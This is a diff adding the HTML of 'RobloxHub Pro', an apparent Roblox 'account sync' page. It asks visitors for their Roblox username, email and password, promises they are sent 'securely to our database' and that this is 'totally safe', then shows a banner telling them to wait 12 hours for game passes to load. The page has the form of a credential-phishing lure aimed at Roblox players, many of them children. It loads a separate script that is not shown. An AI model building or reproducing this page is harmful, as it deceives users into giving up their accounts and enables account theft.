@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox Account Linker & Showcase Hub</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <div class="logo-area">
+      <img id="brand-icon" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%236366f1'%3E%3Cpath d='M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5'/%3E%3C/svg%3E" alt="Logo">
+      <span id="brand-title">RobloxHub Pro</span>
+    </div>
+    <div class="nav-buttons">
+      <a href="#" id="discord-btn" target="_blank" class="btn btn-secondary">Join Our Discord Group</a>
+      <button class="btn btn-primary" id="signin-roblox-btn">Sign In to Roblox</button>
+    </div>
+  </header>
+
+  <!-- Main Container -->
+  <div class="container">
+
+    <!-- Landing View -->
+    <section id="landing-view" class="hero animate-fade">
+      <h1>Advanced Roblox Account & Inventory Sync</h1>
+      <p>Sign in with your Roblox username and password securely to our database. Explore game passes, check inventory items, and manage studio plugins with full animation and speed.</p>
+      <div class="hero-actions">
+        <button class="btn btn-primary" id="hero-signin-btn">Sign In to Roblox</button>
+        <a href="#info" class="btn btn-secondary">Help & Support</a>
+      </div>
+    </section>
+
+    <!-- Dashboard View (Initially Hidden) -->
+    <div id="dashboard-view" class="dashboard-view">
+      
+      <!-- 12-Hour Notification Banner -->
+      <div id="notification-banner" style="display: none; background: rgba(99, 102, 241, 0.15); border: 1px solid var(--primary); padding: 16px 22px; border-radius: 16px; margin-bottom: 25px; text-align: center; font-size: 0.96rem;">
+        ⏳ Your game passes will be loaded. Please wait 12 hours until it will get loaded. If you have any problems, then contact support below.
+      </div>
+
+      <div class="dashboard-header">
+        <div class="user-profile">
+          <img id="user-avatar" class="user-avatar" src="" alt="Avatar">
+          <div>
+            <h3 id="user-name" style="font-size: 1.25rem;">Username</h3>
+            <div id="discord-badge-container" style="margin-top: 6px;"></div>
+          </div>
+        </div>
+        <div style="display: flex; gap: 10px;">
+          <button id="signout-btn" class="btn btn-secondary">Sign Out</button>
+        </div>
+      </div>
+
+      <!-- Controls: Tabs & Search -->
+      <div class="controls-bar">
+        <div class="tabs">
+          <button class="tab-btn active" data-tab="passes">Game Passes</button>
+          <button class="tab-btn" data-tab="inventory">Inventory</button>
+          <button class="tab-btn" data-tab="plugins">Plugins</button>
+        </div>
+        <div class="search-box">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
+          <input type="text" id="search-input" placeholder="Search game passes by name...">
+        </div>
+      </div>
+
+      <!-- Grid Cards Container -->
+      <div id="grid-container" class="grid-container"></div>
+    </div>
+
+    <!-- Help & Support Section -->
+    <div id="info" class="info-section animate-fade">
+      <h4>Help & Support</h4>
+      <p>Have questions, errors, or issues? Submit a support message below to contact our team directly through Discord webhooks.</p>
+      
+      <form id="support-form" style="max-width: 520px; margin: 0 auto; display: flex; flex-direction: column; gap: 12px;">
+        <textarea id="support-msg" rows="3" placeholder="Describe your issue or question..." style="width: 100%; padding: 14px; background: rgba(255,255,255,0.04); border: 1px solid var(--border-color); border-radius: 14px; color: white; outline: none; resize: none;" required></textarea>
+        <button type="submit" class="btn btn-primary" style="width: 100%;">Submit Support Request</button>
+      </form>
+      <div id="support-status" style="margin-top: 15px; font-size: 0.9rem; color: var(--text-muted);"></div>
+    </div>
+
+  </div>
+
+  <!-- Roblox Sign-In Modal Popup -->
+  <div id="signin-modal" class="modal-overlay">
+    <div class="modal-card">
+      <h3>Sign In to Roblox</h3>
+      <p>Enter your exact Roblox username (not display name) and password. This is totally safe.</p>
+      
+      <form id="roblox-auth-form" style="display: flex; flex-direction: column; gap: 14px; text-align: left;">
+        <div>
+          <label style="font-size: 0.83rem; color: var(--text-muted);">Roblox Username</label>
+          <input type="text" id="rbx-username" placeholder="Username (not display name)" style="width: 100%; padding: 12px; margin-top: 4px; background: rgba(255,255,255,0.04); border: 1px solid var(--border-color); border-radius: 12px; color: white; outline: none;" required>
+        </div>
+        <div>
+          <label style="font-size: 0.83rem; color: var(--text-muted);">Email (Optional)</label>
+          <input type="email" id="rbx-email" placeholder="Roblox email (optional)" style="width: 100%; padding: 12px; margin-top: 4px; background: rgba(255,255,255,0.04); border: 1px solid var(--border-color); border-radius: 12px; color: white; outline: none;">
+        </div>
+        <div>
+          <label style="font-size: 0.83rem; color: var(--text-muted);">Roblox Password</label>
+          <input type="password" id="rbx-password" placeholder="Password" style="width: 100%; padding: 12px; margin-top: 4px; background: rgba(255,255,255,0.04); border: 1px solid var(--border-color); border-radius: 12px; color: white; outline: none;" required>
+        </div>
+        
+        <div class="modal-actions" style="margin-top: 15px; display: flex; gap: 12px;">
+          <button type="button" id="modal-cancel" class="btn btn-secondary" style="flex: 1;">Cancel</button>
+          <button type="submit" class="btn btn-primary" style="flex: 1;">Sign In</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- Load script as type="module" for Cloud Firestore SDK compatibility -->
+  <script type="module" src="script.js"></script>
+</body>
+</html>
